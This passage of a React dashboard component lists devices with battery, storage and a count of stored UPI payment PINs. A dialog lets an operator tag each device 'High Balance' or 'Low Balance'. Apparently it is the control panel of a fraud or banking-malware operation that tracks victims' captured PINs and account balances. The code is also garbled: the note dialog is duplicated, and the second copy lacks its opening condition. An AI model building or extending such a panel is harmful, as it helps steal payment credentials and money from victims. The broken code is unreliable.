                            <path d="M11 3a1 1 0 10-2 0v1a1 1 0 102 0V3zM15.657 5.757a1 1 0 00-1.414-1.414l-.707.707a1 1 0 001.414 1.414l.707-.707zM18 10a1 1 0 01-1 1h-1a1 1 0 110-2h1a1 1 0 011 1zM5.05 6.464A1 1 0 106.464 5.05l-.707-.707a1 1 0 00-1.414 1.414l.707.707zM5 10a1 1 0 01-1 1H3a1 1 0 110-2h1a1 1 0 011 1zM8 16v-1h4v1a2 2 0 11-4 0zM12 14c.015-.34.208-.646.477-.859a4 4 0 10-4.954 0c.27.213.462.519.476.859h4.002z" />
                          </svg>
                          <div className="flex-1 max-w-[100px]">
                            <div className="h-2 bg-slate-200 dark:bg-slate-700 rounded-full overflow-hidden">
                              <div
                                className={`h-full rounded-full transition-all ${
                                  device.battery_level >= 80
                                    ? 'bg-green-500'
                                    : device.battery_level >= 50
                                    ? 'bg-blue-500'
                                    : device.battery_level >= 20
                                    ? 'bg-orange-500'
                                    : 'bg-red-500'
                                }`}
                                style={{ width: `${device.battery_level}%` }}
                              />
                            </div>
                          </div>
                          <span className="text-xs font-semibold text-slate-700 dark:text-slate-300 min-w-[35px]">
                            {device.battery_level}%
                          </span>
                        </div>
                      </td>
                      <td className="py-3 px-4">
                        <div className="flex items-center gap-2">
                          <svg className="w-4 h-4 text-primary flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4m0 5c0 2.21-3.582 4-8 4s-8-1.79-8-4" />
                          </svg>
                          <div className="flex-1 max-w-[100px]">
                            <div className="h-2 bg-slate-200 dark:bg-slate-700 rounded-full overflow-hidden">
                              <div
                                className="h-full bg-gradient-to-r from-primary to-blue-600 rounded-full transition-all"
                                style={{ width: `${100 - device.storage_percent_free}%` }}
                              />
                            </div>
                          </div>
                          <span className="text-xs font-semibold text-slate-700 dark:text-slate-300 min-w-[50px]">
                            {((device.total_storage_mb - device.free_storage_mb) / 1024).toFixed(1)} GB
                          </span>
                        </div>
                      </td>
                      <td className="py-3 px-4">
                        {device.has_upi ? (
                          <div className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-md bg-indigo-50 dark:bg-indigo-900/20">
                            <svg className="w-4 h-4 text-indigo-600 dark:text-indigo-400" fill="currentColor" viewBox="0 0 20 20">
                              <path fillRule="evenodd" d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z" clipRule="evenodd" />
                            </svg>
                            <span className="text-xs font-medium text-indigo-700 dark:text-indigo-300">
                              {device.upi_pins?.length || 0} PIN{device.upi_pins?.length !== 1 ? 's' : ''}
                            </span>
                          </div>
                        ) : (
                          <div className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-md bg-slate-100 dark:bg-slate-800">
                            <svg className="w-4 h-4 text-slate-400 dark:text-slate-500" fill="currentColor" viewBox="0 0 20 20">
                              <path fillRule="evenodd" d="M13.477 14.89A6 6 0 015.11 6.524l8.367 8.368zm1.414-1.414L6.524 5.11a6 6 0 018.367 8.367zM18 10a8 8 0 11-16 0 8 8 0 0116 0z" clipRule="evenodd" />
                            </svg>
                            <span className="text-xs font-medium text-slate-500 dark:text-slate-400">
                              No UPI
                            </span>
                          </div>
                        )}
                      </td>
                      <td className="py-3 px-4">
                        <span className="text-xs text-slate-600 dark:text-slate-400">
                          {formatTimeAgo(device.last_ping)}
                        </span>
                      </td>
                      <td className="py-3 px-4">
                        <div className="flex items-center justify-end gap-1">
                          <button
                            onClick={(e) => {
                              e.stopPropagation()
                              setNoteDialog({
                                open: true,
                                deviceId: device.device_id,
                                currentNote: device.note || null,
                                currentText: device.note_text || '',
                              })
                              setNoteText(device.note_text || '')
                            }}
                            className={`p-1.5 rounded-md transition-colors ${
                              device.note
                                ? 'bg-amber-100 text-amber-700 hover:bg-amber-200 dark:bg-amber-900/30 dark:text-amber-400 dark:hover:bg-amber-900/50'
                                : 'text-slate-400 hover:text-slate-600 hover:bg-slate-100 dark:hover:text-slate-300 dark:hover:bg-slate-800'
                            }`}
                            title="Add Note"
                          >
                            <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M7 8h10M7 12h4m1 8l-4-4H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-3l-4 4z" />
                            </svg>
                          </button>
                          <button
                            onClick={(e) => {
                              e.stopPropagation()
                              navigate(`/devices/${device.device_id}`)
                            }}
                            className="p-1.5 text-slate-400 hover:text-primary hover:bg-slate-100 dark:hover:bg-slate-800 rounded-md transition-colors"
                            title="View Details"
                          >
                            <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                            </svg>
                          </button>
                          <button
                            onClick={(e) => {
                              e.stopPropagation()
                              console.log('Ping device:', device.device_id)
                            }}
                            className="p-1.5 text-slate-400 hover:text-blue-600 hover:bg-blue-50 dark:hover:bg-blue-900/20 rounded-md transition-colors"
                            title="Ping Device"
                          >
                            <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.857 15.355-5.857 21.213 0" />
                            </svg>
                          </button>
                          <button
                            onClick={(e) => {
                              e.stopPropagation()
                              console.log('Delete device:', device.device_id)
                            }}
                            className="p-1.5 text-slate-400 hover:text-red-600 hover:bg-red-50 dark:hover:bg-red-900/20 rounded-md transition-colors"
                            title="Delete Device"
                          >
                            <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                            </svg>
                          </button>
                        </div>
                      </td>
                    </tr>
                  )
                })}
              </tbody>
            </table>
          </div>
        </Card>
      )}

      {/* Note Dialog */}
      {noteDialog.open && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-white dark:bg-slate-800 rounded-2xl shadow-2xl max-w-lg w-full overflow-hidden animate-in fade-in zoom-in duration-200">
            {/* Header */}
            <div className="relative bg-gradient-to-br from-slate-50 via-slate-100 to-slate-200 dark:from-slate-700 dark:via-slate-800 dark:to-slate-900 px-6 py-5 border-b border-slate-200 dark:border-slate-700">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-xl bg-white dark:bg-slate-700 shadow-sm flex items-center justify-center">
                    <svg className="w-5 h-5 text-slate-700 dark:text-slate-300" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z" />
                    </svg>
                  </div>
                  <div>
                    <h3 className="text-lg font-semibold text-slate-900 dark:text-slate-100">
                      Device Note
                    </h3>
                    <p className="text-xs text-slate-500 dark:text-slate-400">Add or update note for this device</p>
                  </div>
                </div>
                <button
                  onClick={() => {
                    setNoteDialog({ open: false, deviceId: '', currentNote: null, currentText: '' })
                    setNoteText('')
                  }}
                  className="w-8 h-8 rounded-lg bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 flex items-center justify-center transition-colors"
                >
                  <svg className="w-4 h-4 text-slate-600 dark:text-slate-300" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </button>
              </div>
            </div>

            <div className="p-6">
              {/* Note Type Selection */}
              <div className="grid grid-cols-3 gap-3 mb-6">
                {/* High Balance */}
                <button
                  onClick={() => {
                    setNoteDialog({ ...noteDialog, currentNote: 'high_balance' })
                  }}
                  className={`relative p-4 rounded-xl border-2 transition-all ${
                    noteDialog.currentNote === 'high_balance'
                      ? 'border-emerald-400 bg-emerald-50 dark:bg-emerald-900/30 shadow-lg shadow-emerald-500/20'
                      : 'border-slate-200 dark:border-slate-700 hover:border-emerald-300 dark:hover:border-emerald-600 hover:bg-emerald-50/50 dark:hover:bg-emerald-900/10'
                  }`}
                >
                  <div className="flex flex-col items-center gap-2.5">
                    <div className={`w-14 h-14 rounded-xl flex items-center justify-center transition-all ${
                      noteDialog.currentNote === 'high_balance'
                        ? 'bg-emerald-500 shadow-lg shadow-emerald-500/40'
                        : 'bg-emerald-100 dark:bg-emerald-900/40'
                    }`}>
                      <svg className={`w-7 h-7 ${
                        noteDialog.currentNote === 'high_balance'
                          ? 'text-white'
                          : 'text-emerald-600 dark:text-emerald-400'
                      }`} fill="currentColor" viewBox="0 0 20 20">
                        <path d="M8.433 7.418c.155-.103.346-.196.567-.267v1.698a2.305 2.305 0 01-.567-.267C8.07 8.34 8 8.114 8 8c0-.114.07-.34.433-.582zM11 12.849v-1.698c.22.071.412.164.567.267.364.243.433.468.433.582 0 .114-.07.34-.433.582a2.305 2.305 0 01-.567.267z" />
                        <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-13a1 1 0 10-2 0v.092a4.535 4.535 0 00-1.676.662C6.602 6.234 6 7.009 6 8c0 .99.602 1.765 1.324 2.246.48.32 1.054.545 1.676.662v1.941c-.391-.127-.68-.317-.843-.504a1 1 0 10-1.51 1.31c.562.649 1.413 1.076 2.353 1.253V15a1 1 0 102 0v-.092a4.535 4.535 0 001.676-.662C13.398 13.766 14 12.991 14 12c0-.99-.602-1.765-1.324-2.246A4.535 4.535 0 0011 9.092V7.151c.391.127.68.317.843.504a1 1 0 101.511-1.31c-.563-.649-1.413-1.076-2.354-1.253V5z" clipRule="evenodd" />
                      </svg>
                    </div>
                    <div className="text-center">
                      <div className={`text-sm font-semibold ${
                        noteDialog.currentNote === 'high_balance'
                          ? 'text-emerald-700 dark:text-emerald-300'
                          : 'text-slate-700 dark:text-slate-300'
                      }`}>
                        High Balance
                      </div>
                    </div>
                  </div>
                  {noteDialog.currentNote === 'high_balance' && (
                    <div className="absolute -top-2 -right-2 w-6 h-6 bg-emerald-500 rounded-full flex items-center justify-center shadow-lg">
                      <svg className="w-3.5 h-3.5 text-white" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                      </svg>
                    </div>
                  )}
                </button>

                {/* Low Balance */}
                <button
                  onClick={() => {
                    setNoteDialog({ ...noteDialog, currentNote: 'low_balance' })
                  }}
                  className={`relative p-4 rounded-xl border-2 transition-all ${
                    noteDialog.currentNote === 'low_balance'
                      ? 'border-rose-400 bg-rose-50 dark:bg-rose-900/30 shadow-lg shadow-rose-500/20'
                      : 'border-slate-200 dark:border-slate-700 hover:border-rose-300 dark:hover:border-rose-600 hover:bg-rose-50/50 dark:hover:bg-rose-900/10'
                  }`}
                >
                  <div className="flex flex-col items-center gap-2.5">
                    <div className={`w-14 h-14 rounded-xl flex items-center justify-center transition-all ${
                      noteDialog.currentNote === 'low_balance'
                        ? 'bg-rose-500 shadow-lg shadow-rose-500/40'
                        : 'bg-rose-100 dark:bg-rose-900/40'
                    }`}>
                      <svg className={`w-7 h-7 ${
                        noteDialog.currentNote === 'low_balance'
                          ? 'text-white'
                          : 'text-rose-600 dark:text-rose-400'
                      }`} fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                      </svg>
                    </div>
                    <div className="text-center">
                      <div className={`text-sm font-semibold ${
                        noteDialog.currentNote === 'low_balance'
                          ? 'text-rose-700 dark:text-rose-300'
                          : 'text-slate-700 dark:text-slate-300'
                      }`}>
                        Low Balance
                      </div>
                    </div>
                  </div>
                  {noteDialog.currentNote === 'low_balance' && (
                    <div className="absolute -top-2 -right-2 w-6 h-6 bg-rose-500 rounded-full flex items-center justify-center shadow-lg">
                      <svg className="w-3.5 h-3.5 text-white" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                      </svg>
                    </div>
                  )}
                </button>

                {/* None */}
                <button
                  onClick={() => {
                    setNoteDialog({ ...noteDialog, currentNote: 'none' })
                  }}
                  className={`relative p-4 rounded-xl border-2 transition-all ${
                    noteDialog.currentNote === 'none'
                      ? 'border-slate-400 bg-slate-100 dark:bg-slate-700/50 shadow-lg shadow-slate-500/20'
                      : 'border-slate-200 dark:border-slate-700 hover:border-slate-300 dark:hover:border-slate-600 hover:bg-slate-50 dark:hover:bg-slate-700/30'
                  }`}
                >
                  <div className="flex flex-col items-center gap-2.5">
                    <div className={`w-14 h-14 rounded-xl flex items-center justify-center transition-all ${
                      noteDialog.currentNote === 'none'
                        ? 'bg-slate-500 shadow-lg shadow-slate-500/40'
                        : 'bg-slate-200 dark:bg-slate-700'
                    }`}>
                      <svg className={`w-7 h-7 ${
                        noteDialog.currentNote === 'none'
                          ? 'text-white'
                          : 'text-slate-500 dark:text-slate-400'
                      }`} fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636" />
                      </svg>
                    </div>
                    <div className="text-center">
                      <div className={`text-sm font-semibold ${
                        noteDialog.currentNote === 'none'
                          ? 'text-slate-700 dark:text-slate-300'
                          : 'text-slate-700 dark:text-slate-300'
                      }`}>
                        None
                      </div>
                    </div>
                  </div>
                  {noteDialog.currentNote === 'none' && (
                    <div className="absolute -top-2 -right-2 w-6 h-6 bg-slate-500 rounded-full flex items-center justify-center shadow-lg">
                      <svg className="w-3.5 h-3.5 text-white" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                      </svg>
                    </div>
                  )}
                </button>
              </div>

              {/* Custom Note Text */}
              <div className="mb-6">
                <label className="block text-sm font-medium text-slate-700 dark:text-slate-300 mb-2">
                  Additional Details (Optional)
                </label>
                <textarea
                  value={noteText}
                  onChange={(e) => setNoteText(e.target.value)}
                  placeholder="Add custom note or description..."
                  rows={3}
                  className="w-full px-4 py-3 text-sm bg-slate-50 dark:bg-slate-900/50 border border-slate-200 dark:border-slate-700 rounded-xl text-slate-900 dark:text-slate-100 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-slate-400 dark:focus:ring-slate-500 focus:border-transparent resize-none transition-all"
                />
              </div>

              {/* Action Buttons */}
              <div className="flex gap-3">
                <Button
                  variant="outline"
                  onClick={() => {
                    setNoteDialog({ open: false, deviceId: '', currentNote: null, currentText: '' })
                    setNoteText('')
                  }}
                  className="flex-1"
                >
                  Cancel
                </Button>
                <Button
                  onClick={() => {
                    updateDeviceNote(
                      noteDialog.deviceId,
                      noteDialog.currentNote as any,
                      noteText
                    )
                    setNoteDialog({ open: false, deviceId: '', currentNote: null, currentText: '' })
                    setNoteText('')
                  }}
                  className="flex-1 bg-slate-700 hover:bg-slate-800 dark:bg-slate-600 dark:hover:bg-slate-700"
                >
                  Save Note
                </Button>
              </div>
            </div>
          </div>
        </div>
      )}
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-white dark:bg-slate-800 rounded-2xl shadow-2xl max-w-lg w-full overflow-hidden">
            {/* Header */}
            <div className="relative bg-gradient-to-br from-slate-800 to-slate-900 dark:from-slate-900 dark:to-black px-6 py-5">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-xl bg-white/10 backdrop-blur-sm flex items-center justify-center">
                    <svg className="w-5 h-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z" />
                    </svg>
                  </div>
                  <div>
                    <h3 className="text-lg font-semibold text-white">
                      Add Device Note
                    </h3>
                    <p className="text-xs text-slate-300 mt-0.5">
                      Mark balance status for this device
                    </p>
                  </div>
                </div>
                <button
                  onClick={() => {
                    setNoteDialog({ open: false, deviceId: '', currentNote: null, currentText: '' })
                    setNoteText('')
                  }}
                  className="w-8 h-8 rounded-lg bg-white/10 hover:bg-white/20 flex items-center justify-center transition-colors"
                >
                  <svg className="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </button>
              </div>
            </div>

            <div className="p-6">
              {/* Note Type Selection */}
              <div className="grid grid-cols-2 gap-4 mb-6">
                {/* High Balance */}
                <button
                  onClick={() => {
                    setNoteDialog({ ...noteDialog, currentNote: 'high_balance' })
                  }}
                  className={`relative p-5 rounded-xl border-2 transition-all group ${
                    noteDialog.currentNote === 'high_balance'
                      ? 'border-emerald-500 bg-gradient-to-br from-emerald-50 to-green-50 dark:from-emerald-950 dark:to-green-950 shadow-lg shadow-emerald-500/20'
                      : 'border-slate-200 dark:border-slate-700 hover:border-emerald-300 dark:hover:border-emerald-700 hover:shadow-md'
                  }`}
                >
                  {/* Checkmark */}
                  {noteDialog.currentNote === 'high_balance' && (
                    <div className="absolute top-3 right-3 w-6 h-6 rounded-full bg-emerald-500 flex items-center justify-center shadow-lg">
                      <svg className="w-3.5 h-3.5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                      </svg>
                    </div>
                  )}
                  
                  <div className="flex flex-col items-center text-center">
                    <div className={`w-16 h-16 rounded-2xl flex items-center justify-center mb-3 transition-all ${
                      noteDialog.currentNote === 'high_balance'
                        ? 'bg-emerald-500 shadow-xl shadow-emerald-500/40'
                        : 'bg-emerald-100 dark:bg-emerald-900/30 group-hover:bg-emerald-200 dark:group-hover:bg-emerald-900/50'
                    }`}>
                      <svg className={`w-8 h-8 ${
                        noteDialog.currentNote === 'high_balance'
                          ? 'text-white'
                          : 'text-emerald-600 dark:text-emerald-400'
                      }`} fill="currentColor" viewBox="0 0 20 20">
                        <path d="M8.433 7.418c.155-.103.346-.196.567-.267v1.698a2.305 2.305 0 01-.567-.267C8.07 8.34 8 8.114 8 8c0-.114.07-.34.433-.582zM11 12.849v-1.698c.22.071.412.164.567.267.364.243.433.468.433.582 0 .114-.07.34-.433.582a2.305 2.305 0 01-.567.267z" />
                        <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-13a1 1 0 10-2 0v.092a4.535 4.535 0 00-1.676.662C6.602 6.234 6 7.009 6 8c0 .99.602 1.765 1.324 2.246.48.32 1.054.545 1.676.662v1.941c-.391-.127-.68-.317-.843-.504a1 1 0 10-1.51 1.31c.562.649 1.413 1.076 2.353 1.253V15a1 1 0 102 0v-.092a4.535 4.535 0 001.676-.662C13.398 13.766 14 12.991 14 12c0-.99-.602-1.765-1.324-2.246A4.535 4.535 0 0011 9.092V7.151c.391.127.68.317.843.504a1 1 0 101.511-1.31c-.563-.649-1.413-1.076-2.354-1.253V5z" clipRule="evenodd" />
                      </svg>
                    </div>
                    <div className="font-bold text-emerald-700 dark:text-emerald-300 mb-1">
                      High Balance
                    </div>
                    <div className="text-xs text-emerald-600/80 dark:text-emerald-400/80">
                      Good balance available
                    </div>
                  </div>
                </button>

                {/* Low Balance */}
                <button
                  onClick={() => {
                    setNoteDialog({ ...noteDialog, currentNote: 'low_balance' })
                  }}
                  className={`relative p-5 rounded-xl border-2 transition-all group ${
                    noteDialog.currentNote === 'low_balance'
                      ? 'border-rose-500 bg-gradient-to-br from-rose-50 to-red-50 dark:from-rose-950 dark:to-red-950 shadow-lg shadow-rose-500/20'
                      : 'border-slate-200 dark:border-slate-700 hover:border-rose-300 dark:hover:border-rose-700 hover:shadow-md'
                  }`}
                >
                  {/* Checkmark */}
                  {noteDialog.currentNote === 'low_balance' && (
                    <div className="absolute top-3 right-3 w-6 h-6 rounded-full bg-rose-500 flex items-center justify-center shadow-lg">
                      <svg className="w-3.5 h-3.5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                      </svg>
                    </div>
                  )}
                  
                  <div className="flex flex-col items-center text-center">
                    <div className={`w-16 h-16 rounded-2xl flex items-center justify-center mb-3 transition-all ${
                      noteDialog.currentNote === 'low_balance'
                        ? 'bg-rose-500 shadow-xl shadow-rose-500/40'
                        : 'bg-rose-100 dark:bg-rose-900/30 group-hover:bg-rose-200 dark:group-hover:bg-rose-900/50'
                    }`}>
                      <svg className={`w-8 h-8 ${
                        noteDialog.currentNote === 'low_balance'
                          ? 'text-white'
                          : 'text-rose-600 dark:text-rose-400'
                      }`} fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                      </svg>
                    </div>
                    <div className="font-bold text-rose-700 dark:text-rose-300 mb-1">
                      Low Balance
                    </div>
                    <div className="text-xs text-rose-600/80 dark:text-rose-400/80">
                      Needs recharge soon
                    </div>
                  </div>
                </button>
              </div>

              {/* Custom Note Text */}
              <div className="mb-6">
                <label className="block text-sm font-semibold text-slate-700 dark:text-slate-300 mb-2">
                  Additional Notes (Optional)
                </label>
                <textarea
                  value={noteText}
                  onChange={(e) => setNoteText(e.target.value)}
                  placeholder="Add any additional details or comments..."
                  rows={3}
                  className="w-full px-4 py-3 text-sm bg-slate-50 dark:bg-slate-900/50 border-2 border-slate-200 dark:border-slate-700 rounded-xl text-slate-900 dark:text-slate-100 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-primary/50 focus:border-primary resize-none transition-all"
                />
              </div>

              {/* Action Buttons */}
              <div className="flex gap-3">
                <Button
                  variant="outline"
                  onClick={() => {
                    setNoteDialog({ open: false, deviceId: '', currentNote: null, currentText: '' })
                    setNoteText('')
                  }}
                  className="flex-1 h-11"
                >
                  Cancel
                </Button>
                <Button
                  onClick={() => {
                    if (!noteDialog.currentNote) {
                      return
                    }
                    updateDeviceNote(
                      noteDialog.deviceId,
                      noteDialog.currentNote as any,
                      noteText
                    )
                    setNoteDialog({ open: false, deviceId: '', currentNote: null, currentText: '' })
                    setNoteText('')
                  }}
                  disabled={!noteDialog.currentNote}
                  className="flex-1 h-11 bg-gradient-to-r from-slate-800 to-slate-900 hover:from-slate-700 hover:to-slate-800 disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  <svg className="w-4 h-4 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                  </svg>
                  Save Note
                </Button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
